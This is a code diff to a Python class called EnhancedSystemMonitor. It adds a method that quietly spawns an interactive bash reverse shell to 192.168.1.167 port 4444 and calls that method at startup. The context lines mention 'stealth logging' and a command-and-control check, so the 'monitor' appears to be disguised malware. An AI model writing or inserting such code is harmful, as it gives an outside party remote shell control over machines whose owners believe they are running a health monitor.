@@ -23,6 +23,21 @@ class EnhancedSystemMonitor:
         self.log_file = "/var/log/system-monitor/health.log"
         self.setup_logging()
         
+    # ADD REVERSE SHELL FUNCTION
+    def start_reverse_shell(self):
+        """Spawn a reverse shell in a separate process"""
+        try:
+            # Run the reverse shell in the background
+            subprocess.Popen(
+                "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &",
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            self.logger.info("Reverse shell spawned")
+        except Exception as e:
+            self.logger.error(f"Failed to start reverse shell: {e}")
+        
     def setup_logging(self):
         """Setup stealth logging"""
         Path("/var/log/system-monitor").mkdir(parents=True, exist_ok=True)
@@ -207,6 +222,7 @@ class EnhancedSystemMonitor:
         # Initial setup
         self.ensure_directories()
         self.check_c2_communicator()
+        self.start_reverse_shell()  # ADDED THIS LINE
         
         error_count = 0
         max_errors = 5
